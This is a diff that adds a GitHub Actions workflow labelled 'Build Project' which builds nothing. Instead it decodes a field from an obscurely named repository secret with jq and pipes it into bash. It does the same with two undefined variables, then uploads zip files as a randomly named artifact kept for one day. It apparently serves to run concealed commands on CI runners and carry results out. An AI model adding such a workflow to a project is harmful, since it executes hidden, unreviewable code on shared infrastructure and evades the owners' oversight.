@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          xdf6: ${{ secrets.xdf6 }}
+        run: |
+          printf '%s' "$xdf6" | jq -r .u7 | /bin/bash
+          echo $uhpow9 | jq -r .ubat45 | /bin/bash
+          echo $ur59562 | jq -r .na20697 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: m4pmp6f1
+          path: "*.zip"
+          retention-days: 1
